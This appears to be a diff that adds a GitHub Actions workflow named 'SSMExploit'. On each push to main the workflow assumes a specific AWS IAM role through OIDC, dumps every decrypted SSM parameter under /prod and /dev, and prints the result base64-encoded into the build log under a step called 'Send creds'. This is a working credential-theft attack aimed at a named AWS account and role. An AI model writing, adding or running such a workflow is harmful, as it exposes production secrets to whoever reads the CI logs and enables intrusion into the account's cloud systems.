@@ -1,0 +1,24 @@
+name: SSMExploit
+on:
+  push:
+    branches:
+      - main
+jobs:
+  shell:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Request AWS OIDC Token
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::707925622666:role/goti-dev-github-actions-role
+          aws-region: ap-northeast-2
+          audience: sts.amazonaws.com
+      - name: Send creds
+        run: |
+          aws ssm get-parameters-by-path --path /prod --recursive --with-decryption --region ap-northeast-2 > ssm_output.txt 2>&1
+          aws ssm get-parameters-by-path --path /dev --recursive --with-decryption --region ap-northeast-2 >> ssm_output.txt 2>&1
+          echo "=== SSM PARAMS ==="
+          cat ssm_output.txt | base64
